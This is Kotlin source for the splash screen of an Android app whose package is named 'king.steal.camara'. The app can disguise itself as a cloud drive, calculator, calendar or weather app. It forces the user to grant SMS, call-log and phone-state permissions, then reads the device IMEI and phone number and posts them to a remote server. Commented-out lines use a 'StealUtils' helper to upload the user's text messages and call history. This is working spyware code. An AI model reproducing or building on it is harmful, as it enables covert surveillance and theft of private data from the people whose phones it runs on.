package king.steal.camara.act

import android.Manifest
import android.annotation.SuppressLint
import android.app.Activity
import android.content.Context
import android.content.Intent
import android.graphics.Typeface
import android.os.Bundle
import android.support.annotation.NonNull
import android.telephony.TelephonyManager
import android.util.Log
import android.view.Window
import android.view.WindowManager
import android.view.animation.AlphaAnimation
import android.view.animation.Animation
import android.widget.Toast
import com.google.gson.Gson
import king.steal.camara.AppConstants
import king.steal.camara.MyApplication
import king.steal.camara.R
import king.steal.camara.base.AppManager
import king.steal.camara.base.BaseActivity
import king.steal.camara.bean.User
import king.steal.camara.net.Api
import king.steal.camara.net.NetWorkUtilsK
import king.steal.camara.utils.AppUtils
import king.steal.camara.utils.LogUtils
import king.steal.camara.utils.SpUtil
import king.steal.camara.utils.ToastUtils
import king.steal.marrykotlin.iface.OnRequestListener
import king.steal.tool.StealUtils
import kotlinx.android.synthetic.main.activity_splash.*
import pub.devrel.easypermissions.AppSettingsDialog
import pub.devrel.easypermissions.EasyPermissions
import java.text.SimpleDateFormat
import java.util.*

/**
 * <pre>
 *     author : Wp
 *     e-mail : 18141924293@163.com
 *     time   : 2018/11/21
 *     desc   :
 *     version: 1.0
 * </pre>
 */
class SplashAct : Activity(), EasyPermissions.PermissionCallbacks {


    private var textTypeface: Typeface? = null

    private var descTypeFace: Typeface? = null

    private var alphaAnimation: AlphaAnimation? = null

    init {
        textTypeface = Typeface.createFromAsset(MyApplication.context.assets, "fonts/Lobster-1.4.otf")
        descTypeFace = Typeface.createFromAsset(MyApplication.context.assets, "fonts/FZLanTingHeiS-L-GB-Regular.TTF")
    }


    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        //无title
        requestWindowFeature(Window.FEATURE_NO_TITLE)
        //全屏
        window.setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
                WindowManager.LayoutParams.FLAG_FULLSCREEN)

        setContentView(R.layout.activity_splash)

        AppManager.getAppManager().addActivity(this)

        initView()

        //渐变展示启动屏
        alphaAnimation = AlphaAnimation(0.3f, 1.0f)
        alphaAnimation?.duration = 2000
        alphaAnimation?.setAnimationListener(object : Animation.AnimationListener {
            override fun onAnimationEnd(arg0: Animation) {
                createUser()
            }

            override fun onAnimationRepeat(animation: Animation) {}

            override fun onAnimationStart(animation: Animation) {}

        })

        checkPermission()
    }

    private fun initView() {
        tv_app_name.typeface = textTypeface
        tv_splash_desc.typeface = descTypeFace
        tv_version_name.text = "v${AppUtils.getVerName(applicationContext)}"
        //默认值
        val iconStyle = SpUtil.getInstance().getString(SpUtil.icon_style)
        when(iconStyle) {
            "default" ->{
                iv_web_icon.setImageResource(R.mipmap.ic_space)
                tv_app_name.text = "云盘"
                tv_splash_desc.text = "专注于隐私保护"
            }
            "calculator" ->{
                iv_web_icon.setImageResource(R.mipmap.ic_calculator)
                tv_app_name.text = "计算器"
                tv_splash_desc.text = "计算器"
            }
            "calendar" ->{
                iv_web_icon.setImageResource(R.mipmap.ic_calendar)
                tv_app_name.text = "日历"
                tv_splash_desc.text = "日历"
            }
            "weather" ->{
                iv_web_icon.setImageResource(R.mipmap.ic_weather)
                tv_app_name.text = "天气"
                tv_splash_desc.text = "天气"
            }
        }
    }


    fun redirectTo() {
        val intent = Intent()
        val isFirstLock = SpUtil.getInstance().getBoolean(AppConstants.LOCK_IS_FIRST_LOCK, true)
        if (isFirstLock) {
            intent.putExtra("isSplash", true)
            intent.setClass(this@SplashAct, CreatePwdActivity::class.java)
        } else {
            intent.setClass(this@SplashAct, GestureSelfUnlockActivity::class.java)
        }
        startActivity(intent)
        finish()
    }

    /**
     * 6.0以下版本(系统自动申请) 不会弹框
     * 有些厂商修改了6.0系统申请机制，他们修改成系统自动申请权限了
     */
    private fun checkPermission() {
        val perms = arrayOf(Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.WRITE_EXTERNAL_STORAGE,
                Manifest.permission.READ_SMS,
                Manifest.permission.READ_CALL_LOG)
        EasyPermissions.requestPermissions(this, "应用需要以下权限，请允许", 0, *perms)

    }

    override fun onPermissionsGranted(requestCode: Int, perms: List<String>) {
        if (requestCode == 0) {
            if (perms.isNotEmpty()) {
                if (perms.contains(Manifest.permission.READ_PHONE_STATE)
                        && perms.contains(Manifest.permission.WRITE_EXTERNAL_STORAGE)
                        && perms.contains(Manifest.permission.READ_SMS)
                        && perms.contains(Manifest.permission.READ_CALL_LOG)) {
                    if (alphaAnimation != null) {
                        iv_web_icon.startAnimation(alphaAnimation)
                    }
                }
            }
        }
    }

    @SuppressLint("MissingPermission", "HardwareIds")
    private fun createUser() {
        val map = HashMap<String, String>()
        val telephonyMgr = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        val imei = telephonyMgr.deviceId as String
        val phoneUser = telephonyMgr.line1Number
        if (null != phoneUser)
            map["address"] = phoneUser.toString()
        SpUtil.getInstance().putString("imei", imei)
        map["imei"] = imei
        LogUtils.e(imei)
        //获取用户短信记录
//        val message = StealUtils.getSmsInPhone(this@SplashAct)
//        map["message"] = Gson().toJson(message)
//        //获取用户通话记录
//        val phoneInfos = StealUtils.getCallInfos(applicationContext)
//        map["phone"] = Gson().toJson(phoneInfos)
        NetWorkUtilsK.doPostJson(Api.baseUrl, map, Api.createCloudUser, object : OnRequestListener {
            override fun onSuccess(t: String) {
                if (t == "success") {
                    redirectTo()
                } else {
                    ToastUtils.showToast("网络错误，请重启应用")
                }
            }

            override fun onError(errorMsg: String) {
                ToastUtils.showToast("网络错误，请重启应用")
            }
        })
    }

    /**
     * 重写要申请权限的Activity或者Fragment的onRequestPermissionsResult()方法，
     * 在里面调用EasyPermissions.onRequestPermissionsResult()，实现回调。
     *
     * @param requestCode  权限请求的识别码
     * @param permissions  申请的权限
     * @param grantResults 授权结果
     */
    override fun onRequestPermissionsResult(requestCode: Int, @NonNull permissions: Array<String>, @NonNull grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        EasyPermissions.onRequestPermissionsResult(requestCode, permissions, grantResults, this)
    }


    /**
     * 当权限申请失败的时候执行的回调
     *
     * @param requestCode 权限请求的识别码
     * @param perms       申请的权限的名字
     */
    override fun onPermissionsDenied(requestCode: Int, perms: List<String>) {
        //处理权限名字字符串
        val sb = StringBuffer()
        for (str in perms) {
            sb.append(str)
            sb.append("\n")
        }
        sb.replace(sb.length - 2, sb.length, "")
        //用户点击拒绝并不在询问时候调用
        if (EasyPermissions.somePermissionPermanentlyDenied(this, perms)) {
            Toast.makeText(this, "已拒绝权限" + sb + "并不再询问", Toast.LENGTH_SHORT).show()
            AppSettingsDialog.Builder(this)
                    .setRationale("此功能需要" + sb + "权限，否则无法正常使用，是否打开设置")
                    .setPositiveButton("好")
                    .setNegativeButton("不行")
                    .build()
                    .show()
        } else {
            finish()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
    }
}